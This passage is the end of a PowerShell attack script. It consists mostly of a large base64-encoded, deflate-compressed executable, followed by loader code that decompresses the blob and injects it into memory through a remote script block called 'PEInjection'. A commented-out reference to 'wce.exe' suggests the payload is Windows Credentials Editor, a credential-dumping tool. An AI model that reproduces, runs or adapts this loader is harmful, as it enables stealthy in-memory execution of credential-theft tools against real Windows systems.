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
'@
$DeflatedStream = New-Object IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String($EncodedCompressedFile),[IO.Compression.CompressionMode]::Decompress)
$UncompressedFileBytes = New-Object Byte[](68096)
$DeflatedStream.Read($UncompressedFileBytes, 0, 68096) | Out-Null

    #############################

    #[Byte[]]$PEBytes = [Byte[]][Convert]::FromBase64String($PEBytes64)
    #$PEBytes = [IO.File]::ReadAllBytes('wce.exe')

	Invoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($UncompressedFileBytes, "Void", 0, "",1)
}

Main
}
#参数为可选
PEInjection